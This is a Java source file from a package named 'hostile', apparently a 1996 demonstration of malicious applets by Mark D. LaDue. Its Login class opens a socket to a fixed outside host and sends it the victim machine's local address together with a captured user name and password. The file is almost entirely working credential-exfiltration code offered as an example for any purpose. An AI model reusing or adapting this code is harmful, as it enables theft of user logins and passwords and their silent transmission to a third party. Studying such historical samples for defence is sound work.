package hostile;

/*  Login.java by Mark D. LaDue */

/*  February 28, 1996 */

/*  Copyright (c) 1996 Mark D. LaDue
    You may study, use, modify, and distribute this example for any purpose.
    This example is provided WITHOUT WARRANTY either expressed or implied.  */

/*  This class allows the applet to communicate with its home. */

import java.applet.Applet;
import java.awt.*;
import java.io.*;
import java.net.*;

public class Login {

    String home = new String("www.math.gatech.edu");
    int port = 7000;
    String localhome = null;
    boolean debug = false;
    InetAddress localHome = null;
    String localAddress = null;

//  Construct the class
    Login(int port) {
        this.port = port;
    }

    public void communicate (String user, String pword) {
        Socket sock = null;
//      InputStream inStream;
        OutputStream outStream = null;
        byte b[] = new byte[128];
        int numbytes;
        String reply;
        StringBuffer sb = new StringBuffer();
        InetAddress inaddress = null;

//      System.out.println("I'm up to no good");
        try {
            sock = new Socket(home, port);
            outStream = sock.getOutputStream();
        }
        catch (IOException ioe) {
            if (debug)
                System.out.println("I can't open a socket to " + home);
        }
        try {
            if (debug)
                System.out.println("Sending login and password to " + home);
            inaddress = sock.getInetAddress();
            try {
                localHome = inaddress.getLocalHost();
                localAddress = localHome.toString();
            }
            catch (UnknownHostException u) {
                System.out.println("I can't get the remote host's name");
            }
            sb.append(localAddress + "\t" + user + "\t" + pword + "\n"); 
            reply = sb.toString();
            numbytes = reply.length();
            reply.getBytes(0, numbytes, b, 0);
            outStream.write(b, 0, numbytes);
        }
        catch (IOException ioe) {
            if (debug)
                System.out.println("I can't talk to " + home);
        }
    }
}
 
